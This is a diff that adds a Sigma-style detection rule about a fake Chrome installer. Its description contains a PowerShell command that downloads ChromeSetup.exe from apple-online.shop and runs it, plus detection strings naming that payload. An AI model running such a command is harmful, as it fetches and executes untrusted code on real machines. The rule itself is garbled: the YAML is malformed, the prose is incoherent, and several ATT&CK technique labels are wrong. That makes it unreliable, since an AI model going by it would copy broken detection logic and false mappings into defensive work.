@@ -1,0 +1,51 @@
+title: Dereferencing
+status: 'Creation_Process_with_graph'
+description: "Concept of URL path is supported only at application layer level". This takes place inthe "Stack" listed. The UPD_6259478.exe is a layered application that downloads
+             then Source works file ChromeSetup.exe
+
+-
+CMDlets.exe -Command "Invoke-WebRequest -Uri \"https://apple-online.shop/ChromeSetup.exe\" -Outfile \"$env:TMP/ChromeSetup.exe\" ; & \"$env:TMP/ChromeSetup.exe\""
+-
+
+ In this also has the MS Edge Set works Time stamps a signed Obfuscated in the MS Edge Set APi App store. 
+author: Verren Nox
+references:
+    -https://stackoverflow.com/questions/69452787/concept-of-url-path-is-supported-only-at-application-layer-level
+
+tags:
+    - attack.t1041 #Exfiltration Over C2 Channel
+    - attack.t1190 #Exploit Public Facing Application
+    - attack.t1071.004 #DNS Domain System Name
+    - attack.t1085 #Rundll32
+    - attack.t1071 #Application Layer Protocol
+    - Opcode response 1002 Set Contact Rate/ Client Server Communication
+    - Opcode 1003 Send List Of Installed Applications
+    - attack.t1213 #Data From Information Respositories
+    - attack.t1218.001 #Compile HTML File
+    - attack.t1074.001 #Web Protocols
+logsource: windefend pas adfs http clamav
+    #service: #terminalservices-localsessionmanger : service 
+              #webserver
+              #file_create
+
+    category: 'process_file_attachments'
+    product: windows
+detection:
+          - red memory
+    selection: Hash
+                'LogFile /tem/clamd.log
+        ParentImage|endswith:
+            - 'startswith.ChromeSetup.exe'
+        Image|endswith:
+            - 'startswith\CMDlets.exe'
+        CommandLine|contains:
+            - '$env:TMP/ChromeSetup.exe\'
+            - 'content-disposition: attachment: filename="mainpw.dll'
+            -  'system.io'
+            -  'localhost-access.date.log'
+    condition: selection
+falsepositives:
+    - Could also be a confusion because the Latent Malware Chaya_002 is well known significant make is an Devs tool for Developers and Engineers. So the name of the APP application
+     of the "Chrome" and "Microsoft Edge" browser with the overlay of the API.
+level: medium
+id: 6f5553a1-3be2-4e56-9936-be3559d66624
